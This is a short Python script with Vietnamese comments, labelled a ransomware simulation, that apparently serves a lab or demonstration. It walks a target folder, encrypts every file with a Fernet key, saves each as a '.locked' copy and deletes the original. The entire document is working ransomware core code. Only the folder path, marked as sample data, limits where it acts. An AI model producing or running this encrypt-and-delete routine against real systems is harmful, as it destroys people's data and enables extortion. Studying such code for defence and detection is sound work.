import os
from cryptography.fernet import Fernet

# =========================
# CẤU HÌNH
# =========================
TARGET_DIR = r"F:\Du_Lieu_Mau"   # THƯ MỤC DỮ LIỆU GIẢ
KEY_FILE = "test_key.key"        # FILE LƯU KEY
EXTENSION = ".locked"            # ĐUÔI FILE SAU KHI MÃ HÓA

# =========================
# TẠO / ĐỌC KHÓA MÃ HÓA
# =========================
def load_or_create_key():
    """
    Tạo khóa AES (Fernet) nếu chưa tồn tại,
    hoặc đọc lại khóa cũ nếu đã có.
    """
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
        print("[*] Đã tạo khóa mã hóa mới")
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
        print("[*] Đã nạp khóa mã hóa cũ")

    return key

# =========================
# HÀM MÃ HÓA FILE
# =========================
def encrypt_files():
    key = load_or_create_key()
    cipher = Fernet(key)

    encrypted_count = 0
    error_count = 0

    print("\n[*] Bắt đầu mô phỏng ransomware...\n")

    for root, _, files in os.walk(TARGET_DIR):
        for filename in files:
            file_path = os.path.join(root, filename)

            # Bỏ qua file đã mã hóa
            if filename.endswith(EXTENSION):
                continue

            try:
                # Đọc dữ liệu gốc
                with open(file_path, "rb") as f:
                    data = f.read()

                # Mã hóa
                encrypted_data = cipher.encrypt(data)

                # Ghi file mới
                encrypted_path = file_path + EXTENSION
                with open(encrypted_path, "wb") as f:
                    f.write(encrypted_data)

                # Xóa file gốc
                try:
                    os.remove(file_path)
                except PermissionError:
                    print(f"[!] Không thể xóa (file đang bị khóa): {file_path}")
                    error_count += 1
                    continue

                encrypted_count += 1
                print(f"[+] Đã mã hóa: {file_path}")

            except Exception as e:
                print(f"[!] Lỗi khi xử lý {file_path}: {e}")
                error_count += 1

    print("\n=== KẾT QUẢ MÔ PHỎNG ===")
    print(f"[+] File mã hóa thành công : {encrypted_count}")
    print(f"[!] File gặp lỗi          : {error_count}")
    print("=== MÔ PHỎNG RANSOMWARE HOÀN TẤT ===")

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    encrypt_files()
